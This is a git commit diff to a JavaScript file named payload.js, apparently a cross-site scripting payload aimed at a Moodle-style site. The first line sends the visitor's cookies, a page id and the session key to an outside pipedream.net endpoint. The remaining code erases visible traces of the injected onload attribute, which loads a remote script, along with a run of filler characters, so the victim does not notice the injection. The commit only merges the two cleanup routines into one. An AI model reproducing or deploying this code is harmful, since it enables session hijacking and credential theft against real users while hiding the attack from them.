2ef4ccda7c6cbaf7f0fff2ab3abfa3516a1e0f16
NZRXHX <hachimi.nizar.etu@gmail.com>
2025-12-14 23:39:21 +0100

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,6 +1,9 @@
 fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?c='+document.cookie+"&id="+document.querySelector('[data-route="view-settings"]').getAttribute('data-route-param')+"&sesskey="+M.cfg.sesskey);
 (() => {
-  const target = `"onload="import('//nzrxhx.github.io/payloads/payload.js')`;
+  const targets = [
+    `"onload="import('//nzrxhx.github.io/payloads/payload.js')`,
+    `⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`
+  ];
 
   const walker = document.createTreeWalker(
     document.body,
@@ -10,24 +13,10 @@ fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?c='+document.cookie+"&id="+document.qu
 
   let node;
   while ((node = walker.nextNode())) {
-    if (node.nodeValue.includes(target)) {
-      node.nodeValue = node.nodeValue.replace(target, '');
-    }
-  }
-})();
-(() => {
-  const target = `⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`;
-
-  const walker = document.createTreeWalker(
-    document.body,
-    NodeFilter.SHOW_TEXT,
-    null
-  );
-
-  let node;
-  while ((node = walker.nextNode())) {
-    if (node.nodeValue.includes(target)) {
-      node.nodeValue = node.nodeValue.replace(target, '');
-    }
+    targets.forEach(target => {
+      if (node.nodeValue.includes(target)) {
+        node.nodeValue = node.nodeValue.replace(target, '');
+      }
+    });
   }
 })();
